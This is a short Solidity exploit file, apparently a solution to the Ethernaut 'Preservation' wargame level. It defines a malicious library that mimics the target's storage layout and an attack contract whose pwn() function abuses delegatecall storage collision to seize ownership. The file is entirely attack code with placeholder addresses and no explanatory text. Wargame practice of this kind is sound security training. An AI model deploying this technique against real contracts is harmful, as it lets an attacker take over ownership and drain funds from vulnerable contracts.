pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
} 

contract MaliciousLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint256(_time));
    }
}

contract AttackPreservation {
    address preservationAddress = YOUR_INSTANCE_ADDRESS;
    IPreservation preservationContract = IPreservation(preservationAddress);
    
    function pwn() public {
        preservationContract.setFirstTime(uint(address(MALICIOUS_LIBRARY_ADDRESS)));
        preservationContract.setFirstTime(uint(address(YOUR_PLAYER_ADDRESS)));
    }
}
